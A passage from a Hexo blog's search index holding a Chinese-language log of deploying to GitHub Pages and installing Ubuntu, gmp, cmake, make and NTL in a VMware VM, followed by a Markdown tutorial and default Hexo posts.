alt="72"></p></li><li><h4 id="BUG-1"><a href="#BUG-1" class="headerlink" title="BUG"></a>BUG</h4><p><img src="/../pic/Debug.7.jpg" alt="Debug.7"></p><p>参考方法：<a href="https://blog.csdn.net/liuyongshun2/article/details/54629087">https://blog.csdn.net/liuyongshun2/article/details/54629087</a></p><p>解决方法：可能是&#x3D;&#x3D;<strong>缩进</strong>&#x3D;&#x3D;</p><p><img src="/../pic/Debug.7.1.jpg" alt="Debug.7.1"></p></li><li><h4 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h4></li></ol><p><img src="/../pic/Debug.7.2.jpg" alt="Debug.7.2"></p><ol start="6"><li><h4 id="选择-x3D-x3D-Sign-in-with-your-browser-x3D-x3D"><a href="#选择-x3D-x3D-Sign-in-with-your-browser-x3D-x3D" class="headerlink" title="选择&#x3D;&#x3D;Sign in with your browser&#x3D;&#x3D;"></a>选择&#x3D;&#x3D;Sign in with your browser&#x3D;&#x3D;</h4></li><li><p><img src="/../pic/73.jpg" alt="73"></p></li><li><p><img src="/../pic/74.jpg" alt="74"></p></li><li><h4 id="https-eatingcrime-github-io-仍然无法进入"><a href="#https-eatingcrime-github-io-仍然无法进入" class="headerlink" title="https://eatingcrime.github.io/仍然无法进入"></a><a href="https://eatingcrime.github.io/%E4%BB%8D%E7%84%B6%E6%97%A0%E6%B3%95%E8%BF%9B%E5%85%A5">https://eatingcrime.github.io/仍然无法进入</a></h4><p>发现问题</p><p><img src="/../pic/75.jpg" alt="75"><br><strong>解决方法：</strong>参考<a href="https://1187100546.github.io/2019/11/24/spawn-failed/">https://1187100546.github.io/2019/11/24/spawn-failed/</a></p><p>与<a href="https://blog.csdn.net/gbz3300255/article/details/97103621">https://blog.csdn.net/gbz3300255/article/details/97103621</a></p><p>其中的<strong>repo</strong>修改为&#x3D;&#x3D;<a href="mailto:&#x67;&#x69;&#116;&#64;&#103;&#x69;&#116;&#104;&#x75;&#98;&#46;&#99;&#111;&#109;">&#x67;&#x69;&#116;&#64;&#103;&#x69;&#116;&#104;&#x75;&#98;&#46;&#99;&#111;&#109;</a>:yourname&#x2F;yourname.github.io.git&#x3D;&#x3D;</p></li><li><h4 id="问题解决，上传成功"><a href="#问题解决，上传成功" class="headerlink" title="问题解决，上传成功"></a>问题解决，上传成功</h4></li></ol><p><img src="/../pic/76.jpg" alt="76"></p><p><img src="/../pic/77.jpg" alt="77"></p><p>​      再次访问<a href="https://eatingcrime.github.io仍无法进入/">https://eatingcrime.github.io仍无法进入</a></p><p>尝试在终端再次输入&#x3D;&#x3D;hexo clean &amp;&amp; hexo deploy&#x3D;&#x3D;文章成功访问</p><p><img src="/../pic/78.jpg" alt="78"></p><p>这里我个人设置了主题以及一些个性化的配置，效果如下图</p><p><img src="/../pic/100.jpg" alt="100"></p><p>博客网址：<a href="https://eatingcrime.github.io/">https://eatingcrime.github.io/</a></p><h2 id="5、搭建虚拟机"><a href="#5、搭建虚拟机" class="headerlink" title="5、搭建虚拟机"></a>5、搭建虚拟机</h2><h3 id="1、安装VMware"><a href="#1、安装VMware" class="headerlink" title="1、安装VMware"></a>1、安装VMware</h3><h4 id="1-1、下载最新版VMware-Workstation-16-Pro"><a href="#1-1、下载最新版VMware-Workstation-16-Pro" class="headerlink" title="1.1、下载最新版VMware Workstation 16 Pro"></a>1.1、下载最新版VMware Workstation 16 Pro</h4><p>下载地址<a href="https://www.vmware.com/">https://www.vmware.com/</a></p><h4 id="1-2、默认设置安装"><a href="#1-2、默认设置安装" class="headerlink" title="1.2、默认设置安装"></a>1.2、默认设置安装</h4><h3 id="2、使用VMware安装Ubuntu16-04"><a href="#2、使用VMware安装Ubuntu16-04" class="headerlink" title="2、使用VMware安装Ubuntu16.04"></a>2、使用VMware安装Ubuntu16.04</h3><p>参考教程：<a href="http://www.corina.cc/article/51/">http://www.corina.cc/article/51/</a></p><h4 id="2-1-1、下载Ubuntu16-04"><a href="#2-1-1、下载Ubuntu16-04" class="headerlink" title="2.1.1、下载Ubuntu16.04"></a>2.1.1、下载Ubuntu16.04</h4><p>下载地址<a href="http://releases.ubuntu.com/16.04/">http://releases.ubuntu.com/16.04/</a><br><img src="/../pic/12.jpg" alt="12"></p><h4 id="2-2-1、创建虚拟机"><a href="#2-2-1、创建虚拟机" class="headerlink" title="2.2.1、创建虚拟机"></a>2.2.1、创建虚拟机</h4><p><img src="/../pic/15.jpg" alt="15"></p><h4 id="2-2-2、新建虚拟机向导"><a href="#2-2-2、新建虚拟机向导" class="headerlink" title="2.2.2、新建虚拟机向导"></a>2.2.2、新建虚拟机向导</h4><p><img src="/../pic/16.jpg" alt="16"></p><h4 id="2-2-3、硬件兼容性"><a href="#2-2-3、硬件兼容性" class="headerlink" title="2.2.3、硬件兼容性"></a>2.2.3、硬件兼容性</h4><p><img src="/../pic/17.jpg" alt="17"></p><h4 id="2-2-4、安装客户机操作系统"><a href="#2-2-4、安装客户机操作系统" class="headerlink" title="2.2.4、安装客户机操作系统"></a>2.2.4、安装客户机操作系统</h4><p><img src="/../pic/18.jpg" alt="18"></p><h4 id="2-2-5、选择客户机操作系统"><a href="#2-2-5、选择客户机操作系统" class="headerlink" title="2.2.5、选择客户机操作系统"></a>2.2.5、选择客户机操作系统</h4><p><img src="/../pic/19.jpg" alt="19"></p><h4 id="2-2-6、命名虚拟机并设置位置"><a href="#2-2-6、命名虚拟机并设置位置" class="headerlink" title="2.2.6、命名虚拟机并设置位置"></a>2.2.6、命名虚拟机并设置位置</h4><p><img src="/../pic/20.jpg" alt="20"></p><h4 id="2-2-7、-处理器配置"><a href="#2-2-7、-处理器配置" class="headerlink" title="2.2.7、 处理器配置"></a>2.2.7、 处理器配置</h4><p><img src="/../pic/21.jpg" alt="21"></p><h4 id="2-2-8、内存设置"><a href="#2-2-8、内存设置" class="headerlink" title="2.2.8、内存设置"></a>2.2.8、内存设置</h4><p><img src="/../pic/22.jpg" alt="22"></p><h4 id="2-2-9、选择网络"><a href="#2-2-9、选择网络" class="headerlink" title="2.2.9、选择网络"></a>2.2.9、选择网络</h4><p><img src="/../pic/23.jpg" alt="23"></p><h4 id="2-2-10、控制器类型"><a href="#2-2-10、控制器类型" class="headerlink" title="2.2.10、控制器类型"></a>2.2.10、控制器类型</h4><p><img src="/../pic/24.jpg" alt="24"></p><h4 id="2-2-11、-磁盘设置"><a href="#2-2-11、-磁盘设置" class="headerlink" title="2.2.11、 磁盘设置"></a>2.2.11、 磁盘设置</h4><p><img src="/../pic/25.jpg" alt="25"><br><img src="/../pic/26.jpg" alt="26"><br><img src="/../pic/27.jpg" alt="27"><br><img src="/../pic/28.jpg" alt="28"></p><h4 id="2-2-12、自定义硬件"><a href="#2-2-12、自定义硬件" class="headerlink" title="2.2.12、自定义硬件"></a>2.2.12、自定义硬件</h4><p><img src="/../pic/29.jpg" alt="29"><br><img src="/../pic/30.jpg" alt="30"></p><h4 id="2-2-13、创建完成"><a href="#2-2-13、创建完成" class="headerlink" title="2.2.13、创建完成"></a>2.2.13、创建完成</h4><p><img src="/../pic/31.jpg" alt="31"></p><h4 id="2-3-1-启动Linux虚拟机，配置Ubuntu"><a href="#2-3-1-启动Linux虚拟机，配置Ubuntu" class="headerlink" title="2.3.1 启动Linux虚拟机，配置Ubuntu"></a>2.3.1 启动Linux虚拟机，配置Ubuntu</h4><p><img src="/../pic/47.jpg" alt="47"></p><h4 id="2-3-2、BUG"><a href="#2-3-2、BUG" class="headerlink" title="2.3.2、BUG"></a>2.3.2、BUG</h4><p><img src="/../pic/48.jpg" alt="48"></p><h4 id="2-3-3、选择Erase-disk-and-install-Ubuntu"><a href="#2-3-3、选择Erase-disk-and-install-Ubuntu" class="headerlink" title="2.3.3、选择Erase disk and install Ubuntu"></a>2.3.3、选择Erase disk and install Ubuntu</h4><p><img src="/../pic/49.jpg" alt="49"></p><p><img src="/../pic/50.jpg" alt="50"></p><h4 id="2-3-4、选择地区"><a href="#2-3-4、选择地区" class="headerlink" title="2.3.4、选择地区"></a>2.3.4、选择地区</h4><p><img src="/../pic/51.jpg" alt="51"></p><h4 id="2-3-5、选择语言（bug-3）"><a href="#2-3-5、选择语言（bug-3）" class="headerlink" title="2.3.5、选择语言（bug.3）"></a>2.3.5、选择语言（bug.3）</h4><p><img src="/../pic/52.jpg" alt="52"></p><h4 id="2-3-6、设置用户（bug-3）"><a href="#2-3-6、设置用户（bug-3）" class="headerlink" title="2.3.6、设置用户（bug.3）"></a>2.3.6、设置用户（bug.3）</h4><p><img src="/../pic/53.jpg" alt="53"></p><h4 id="2-3-7、等待安装"><a href="#2-3-7、等待安装" class="headerlink" title="2.3.7、等待安装"></a>2.3.7、等待安装</h4><p><img src="/../pic/54.jpg" alt="54"></p><p>重启<br><img src="/../pic/55.jpg" alt="55"></p><h4 id="2-3-8、BUG"><a href="#2-3-8、BUG" class="headerlink" title="2.3.8、BUG"></a>2.3.8、BUG</h4><p><img src="/../pic/Debug.3.jpg" alt="Debug.3"></p><h4 id="2-3-9、进入Ubuntu"><a href="#2-3-9、进入Ubuntu" class="headerlink" title="2.3.9、进入Ubuntu"></a>2.3.9、进入Ubuntu</h4><p><img src="/../pic/56.jpg" alt="56"></p><p><img src="/../pic/57.jpg" alt="57"></p><h3 id="3、UBUNTU初体验"><a href="#3、UBUNTU初体验" class="headerlink" title="3、UBUNTU初体验"></a>3、<strong>UBUNTU</strong>初体验</h3><h4 id="1、安装-c-x2F-c-环境"><a href="#1、安装-c-x2F-c-环境" class="headerlink" title="1、安装 **c&#x2F;c++**环境"></a>1、<strong>安装</strong> **c&#x2F;c++**环境</h4><p><img src="/../pic/58.jpg" alt="58"></p><h4 id="2、查看是否安装成功"><a href="#2、查看是否安装成功" class="headerlink" title="2、查看是否安装成功"></a>2、查看是否安装成功</h4><p><img src="/../pic/59.jpg" alt="59"></p><h4 id="3、测试"><a href="#3、测试" class="headerlink" title="3、测试"></a>3、测试</h4><p><img src="/../pic/60.jpg" alt="60"></p><p><img src="/../pic/61.jpg" alt="61"></p><h4 id="4、安装gmp库"><a href="#4、安装gmp库" class="headerlink" title="4、安装gmp库"></a>4、安装gmp库</h4><h5 id="4-1、下载gmp"><a href="#4-1、下载gmp" class="headerlink" title="4.1、下载gmp"></a>4.1、下载gmp</h5><p>下载地址：<a href="https://gmplib.org/">https://gmplib.org/</a></p><h5 id="4-2、安装gmp"><a href="#4-2、安装gmp" class="headerlink" title="4.2、安装gmp"></a>4.2、安装gmp</h5><p>参考教程：<a href="https://blog.csdn.net/just_h/article/details/82667787">https://blog.csdn.net/just_h/article/details/82667787</a></p><p><a href="https://blog.csdn.net/weixin_41586854/article/details/105022201">https://blog.csdn.net/weixin_41586854/article/details/105022201</a></p><p>将gmp放入虚拟机，解压缩<br><img src="/../pic/79.jpg" alt="79"><br><img src="/../pic/80.jpg" alt="80"></p><p>cd进入 gmp-6.2.1，输入下列指令安装</p><pre><code>$ ./configure $ make$ make check$ make install</code></pre><h5 id="BUG-2"><a href="#BUG-2" class="headerlink" title="BUG"></a>BUG</h5><p>这里指m4没有安装，直接无法安装m4</p><p><img src="/../pic/81.jpg" alt="81"></p><p>解决方法：更换下载源</p><p><img src="/../pic/81.1.jpg" alt="81.1"><br><img src="/../pic/81.2.jpg" alt="81.2"><br>这里选China，换成清华的源<br><img src="/../pic/81.3.jpg" alt="81.3"><br><img src="/../pic/81.4.jpg" alt="81.4"><br>这里显示未联网，登录校园网以后，换源成功<br><img src="/../pic/81.6.jpg" alt="81.5"></p><p>再次尝试下载m4，下载成功！</p><p><img src="/../pic/82.jpg" alt="82"></p><h4 id="5、安装cmake"><a href="#5、安装cmake" class="headerlink" title="5、安装cmake"></a>5、安装cmake</h4><h5 id="5-1、下载cmake"><a href="#5-1、下载cmake" class="headerlink" title="5.1、下载cmake"></a>5.1、下载cmake</h5><p>下载地址：<a href="https://cmake.org/download/">https://cmake.org/download/</a><br><img src="/../pic/83.jpg" alt="83"></p><h5 id="5-2、安装cmake"><a href="#5-2、安装cmake" class="headerlink" title="5.2、安装cmake"></a>5.2、安装cmake</h5><p>放入虚拟机，并解压<br><img src="/../pic/84.jpg" alt="84"></p><p>打开终端，以管理员身份运行，cd进cmake目录，终端内执行<code>./bootstrap</code>指令<br><img src="/../pic/85.jpg" alt="85"></p><h6 id="BUG-3"><a href="#BUG-3" class="headerlink" title="BUG"></a>BUG</h6><p><img src="/../pic/Debug.8.jpg" alt="Debug.8"><br>Debug：<br>参考方法：<a href="https://blog.csdn.net/weixin_45392081/article/details/106447955">https://blog.csdn.net/weixin_45392081/article/details/106447955</a><br>输入：<code>sudo apt install libssl-dev</code><br>再次输入命令<code>./bootstrap</code>，安装成功！</p><p>接下来终端输入<code>make</code><br><img src="/../pic/86.jpg" alt="86"></p><p>输入命令<code>make install</code>注意：这里应该以管理员身份运行<br><img src="/../pic/87.jpg" alt="87"></p><p>检查是否安装成功，输入指令<code>cmake --version</code>，出现版本号即位安装成功<br><img src="/../pic/88.jpg" alt="88"></p><h4 id="6、安装make"><a href="#6、安装make" class="headerlink" title="6、安装make"></a>6、安装make</h4><p>参考方法：<a href="https://blog.csdn.net/JENREY/article/details/100116798">https://blog.csdn.net/JENREY/article/details/100116798</a><br>依次输入一下指令</p><pre><code class="c">sudo suwget http://ftp.gnu.org/gnu/make/make-4.2.tar.gztar -zxvf make-4.2.tar.gzcd make-4.2./configuremakemake installln -s -f /usr/local/bin/make  /usr/bin/make</code></pre><p>检查make是否安装成功，输入<code>make --version</code><br><img src="/../pic/89.jpg" alt="89"></p><h4 id="7、尝试编写程序测试gmp"><a href="#7、尝试编写程序测试gmp" class="headerlink" title="7、尝试编写程序测试gmp"></a>7、尝试编写程序测试gmp</h4><p>输入指令<code>gedit test-gmp.cpp</code><br>编写程序：程序来源为王涛学长</p><pre><code class="c++">#include &lt;stdio.h&gt;#include &lt;gmp.h&gt;void foo (mpz_t result, const mpz_t param, unsigned long n)&#123;    unsigned long i;    mpz_mul_ui (result, param, n);    for (i = 1; i &lt; n; i++)    mpz_add_ui (result, result, i*7);&#125;int main (void)&#123;    mpz_t r, n;    mpz_init (r);    mpz_init_set_str (n, &quot;123456&quot;, 0);    foo (r, n, 20L);    gmp_printf (&quot;%Zd\n&quot;, r);    return 0;&#125;</code></pre><h6 id="BUG-4"><a href="#BUG-4" class="headerlink" title="BUG"></a>BUG</h6><p>问题描述：未找到gmpxx.h头文件</p><p><img src="/../pic/Debug.9.jpg" alt="Debug.9"></p><p>问题1：未执行指令<code>./configure --enable-cxx</code>，这里注意要<code>cd gmp-6.2.1</code><br><img src="/../pic/90.jpg" alt="90"><br>问题2：未安装m4库，输入sudo apt-get install m4<br><img src="/../pic/Debug.9.2.jpg" alt="Debug.9.2"></p><p>安装完成以后cd进入gmp-6.2.1目录</p><p>分别运行指令<code>./configure</code>与<code>make</code></p><p>运行后执行指令<code>make check</code>检查是否没有问题</p><p>没问题之后执行<code>sudo make install</code></p><p>检查是否安装成功<br><img src="/../pic/Debug.9.3.jpg" alt="Debug.9.3"></p><p>问题3：未安装libgmp3-dev，执行指令<code>sudo apt-get install libgmp3-dev</code><br><img src="/../pic/Debug.9.4.jpg" alt="Debug.9.4"></p><h6 id="BUG-5"><a href="#BUG-5" class="headerlink" title="BUG"></a>BUG</h6><h6 id=""><a href="#" class="headerlink" title=""></a><img src="/../pic/Debug.10.jpg" alt="Debug.10"></h6><p>问题1：未链接到静态库<br>解决方法：执行指令g++ test-gmp.cpp -lgmpxx -lgmp<br><img src="/../pic/Debug.10.1.jpg" alt="Debug.10.1"></p><p>问题2：链接指令与生成目标文件指令不可以分开运行<br><img src="/../pic/Debug.10.2.png" alt="Debug.10.2"></p><p>上述指令格式可以正确运行（图来源于王涛学长）</p><blockquote><h5 id="语句指令含义总结（来源于王涛学长）"><a href="#语句指令含义总结（来源于王涛学长）" class="headerlink" title="语句指令含义总结（来源于王涛学长）"></a>语句指令含义总结（来源于王涛学长）</h5><p>g++是使用g++来对文件进行编译<br>xxx.cpp是目标文件<br>-lgmpxx是链接到本地&#x2F;usr&#x2F;lib的gmp静态库<br>-o 是生成的目标文件</p></blockquote><h4 id="8、安装NTL库"><a href="#8、安装NTL库" class="headerlink" title="8、安装NTL库"></a>8、安装NTL库</h4><h5 id="8-1、下载ntl"><a href="#8-1、下载ntl" class="headerlink" title="8.1、下载ntl"></a>8.1、下载ntl</h5><p>下载网址:<a href="https://libntl.org/download.html">https://libntl.org/download.html</a></p><p><img src="/../pic/91.jpg" alt="91"></p><h5 id="8-2、安装ntl"><a href="#8-2、安装ntl" class="headerlink" title="8.2、安装ntl"></a>8.2、安装ntl</h5><p>解压缩，指令：<code>tar -zxvf ntl-11.4.4.tar.gz</code></p><p>管理员身份运行，cd进入ntl-11.4.4文件夹</p><p>ls查看含有那些文件</p><p>cd进入src</p><p><img src="/../pic/93.jpg" alt="93"></p><p>输入<code>./configure</code>安装</p><p><img src="/../pic/94.jpg" alt="94"></p><p>输入<code>make</code></p><p><img src="/../pic/95.jpg" alt="95"></p><h6 id="BUG-6"><a href="#BUG-6" class="headerlink" title="BUG"></a>BUG</h6><p>输入<code>make check</code> 出现问题：未找到ntl.a</p><p><img src="/../pic/96.jpg" alt="96"></p><p>查看ntl文档，make完成后生成nlt.a库</p><p><img src="/../pic/96.1.jpg" alt="96.1"></p><p>仔细查看终端，提示gmp和libgmp的版本不匹配</p><p><img src="/../pic/96.2.jpg" alt="96.2"></p><p>网上搜索，参考方法：<a href="https://www.freesion.com/article/8114447675/">https://www.freesion.com/article/8114447675/</a><br>这里回到主目录，重装libgmp</p><p><img src="/../pic/96.3-1616675522804.jpg" alt="96.3"></p><p>重新安装，问题仍没有解决，尝试安装旧版gmp库（6.1.0）</p><p>官网下载gmp-6.1.0<br><img src="/../pic/97.jpg" alt="97"></p><p>解压缩后，以管理员身份cd进入文件夹<br>cd进入 gmp-6.2.1，输入下列指令安装</p><pre><code>$ ./configure $ make$ make check$ make install</code></pre><p>测试是否安装成功</p><p><img src="/../pic/98.jpg" alt="98"></p><p>再次cd进入ntl-11.4.4&#x2F;src，依次输入下列指令安装</p><pre><code>$ ./configure$ make$ make check$ sudo make install</code></pre><h4 id="9、尝试编写程序测试ntl"><a href="#9、尝试编写程序测试ntl" class="headerlink" title="9、尝试编写程序测试ntl"></a>9、尝试编写程序测试ntl</h4><p>输入指令：<code>gedit test-ntl.cpp</code></p><p>编写程序：程序来源为<a href="https://www.freesion.com/article/8114447675/">https://www.freesion.com/article/8114447675/</a></p><pre><code class="c++">#include &lt;NTL/ZZ.h&gt;using namespace std;using namespace NTL;int main()&#123;   ZZ a, b, c;    cin &gt;&gt; a;    cin &gt;&gt; b;    c = (a+1)*(b+1);   cout &lt;&lt; c &lt;&lt; &quot;\n&quot;;&#125;</code></pre><p>输入编译指令：<code>g++ -std=c++11 -g -O2 test-nlt.cpp -pthread -o test-ntl.o -lntl -lgmp -lm</code></p><p>编译成功，执行程序<code>./test-ntl.o</code><br><img src="/../pic/99.jpg" alt="99"></p>]]></content>
      
      
      <categories>
          
          <category> log </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MarkDown教程</title>
      <link href="/2021/03/18/MarkDown%E6%95%99%E7%A8%8B/"/>
      <url>/2021/03/18/MarkDown%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>&#x3D;&#x3D;（1）标题&#x3D;&#x3D;</p><h1 id="一级标题-一级标题使用1个-Ctrl-1"><a href="#一级标题-一级标题使用1个-Ctrl-1" class="headerlink" title="一级标题(一级标题使用1个#)(Ctrl+1)"></a>一级标题(一级标题使用1个#)(Ctrl+1)</h1><h2 id="二级标题-二级标题使用2个-Ctrl-2"><a href="#二级标题-二级标题使用2个-Ctrl-2" class="headerlink" title="二级标题(二级标题使用2个#)(Ctrl+2)"></a>二级标题(二级标题使用2个#)(Ctrl+2)</h2><h3 id="三级标题-三级标题使用3个-Ctrl-3"><a href="#三级标题-三级标题使用3个-Ctrl-3" class="headerlink" title="三级标题(三级标题使用3个#)(Ctrl+3)"></a>三级标题(三级标题使用3个#)(Ctrl+3)</h3><h4 id="四级标题-四级标题使用4个-Ctrl-4"><a href="#四级标题-四级标题使用4个-Ctrl-4" class="headerlink" title="四级标题(四级标题使用4个#)(Ctrl+4)"></a>四级标题(四级标题使用4个#)(Ctrl+4)</h4><h5 id="五级标题-五级标题使用5个-Ctrl-5"><a href="#五级标题-五级标题使用5个-Ctrl-5" class="headerlink" title="五级标题(五级标题使用5个#)(Ctrl+5)"></a>五级标题(五级标题使用5个#)(Ctrl+5)</h5><h6 id="六级标题-六级标题使用6个-Ctrl-6"><a href="#六级标题-六级标题使用6个-Ctrl-6" class="headerlink" title="六级标题(六级标题使用6个#)(Ctrl+6)"></a>六级标题(六级标题使用6个#)(Ctrl+6)</h6><p>&#x3D;&#x3D;（2）字体&#x3D;&#x3D;</p><p>** 加粗 **<br><strong>加粗</strong> 或 <strong>加粗</strong>(Ctrl + B)</p><p>*斜体 *<br><em>斜体</em> 或 <em>斜体</em>(Ctrl + H)</p><ul><li><ul><li>*斜体加粗 * * *<br><em><strong>斜体加粗</strong></em> 或 <em><strong>斜体加粗</strong></em></li></ul></li></ul><p>~~ 删除线 ~~<br><del>删除线</del> (使用波浪号)(Alt+Shift+5)</p><p>&#x3D;&#x3D; 高亮 &#x3D;&#x3D;<br>&#x3D;&#x3D;高亮&#x3D;&#x3D;</p><p>我是^上标 ^<br>我是 ^上标^</p><p>我是^下标 ^<br>我是<del>下标</del></p><p>&#x3D;&#x3D;（3）列表&#x3D;&#x3D;</p><ul><li>一二三四五<ul><li>上山打老虎<ul><li>老虎没打到<ul><li>打到小松鼠</li></ul></li></ul></li></ul></li></ul><p>+ 一二三四五<br>+ 上山打老虎<br>+ 老虎没打到<br>+ 打到小松鼠</p><ol><li>一二三四五</li><li>上山打老虎</li><li>老虎没打到</li><li>打到小松鼠</li></ol><p>&#x3D;&#x3D;（4）表格(Ctrl+T)&#x3D;&#x3D;</p><table><thead><tr><th>Mon</th><th>TUE</th><th>WED</th><th>THU</th><th>FRI</th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><table><thead><tr><th>上山</th><th>上山</th><th>上山</th><th>上山</th><th>上山</th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>| Mon  | TUE  | WED  | THU  | FRI  |</p><p>| —- | —- | —- | —- | —- |</p><p>|        |        |        |        |        |</p><p>| 上山 | 上山 | 上山 | 上山 | 上山 |</p><p>| —- | —- | —- | —- | —- |</p><p>|        |        |        |        |        |<br>&#x3D;&#x3D;（5）引用(Ctrl+Shift+Q)&#x3D;&#x3D;</p><blockquote><p>一二三四五   （ &gt;一二三四五 ）</p></blockquote><blockquote><blockquote><p>上山打老虎   （ &gt;&gt;一二三四五 ）</p></blockquote></blockquote><blockquote><blockquote><blockquote><p>老虎没打到   （ &gt;&gt;&gt;一二三四五 ）</p></blockquote></blockquote></blockquote><blockquote><blockquote><blockquote><blockquote><p>打到小松鼠   （ &gt;&gt;&gt;&gt;一二三四五 ）</p></blockquote></blockquote></blockquote></blockquote><p>&#x3D;&#x3D;（6）分割线&#x3D;&#x3D;</p><hr><p>&#x3D;&#x3D;（7）代码&#x3D;&#x3D;</p><p><code>我是代码</code></p><pre><code class="c++">我是代码框</code></pre>]]></content>
      
      
      <categories>
          
          <category> log </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/1970/01/01/hello-world/"/>
      <url>/1970/01/01/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;</code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> miscellaneous </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>About me</title>
      <link href="/1970/01/01/me/"/>
      <url>/1970/01/01/me/</url>
      
        <content type="html"><![CDATA[<p>这是Daniel的个人博客Origin</p>]]></content>
      
      
      <categories>
          
          <category> miscellaneous </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
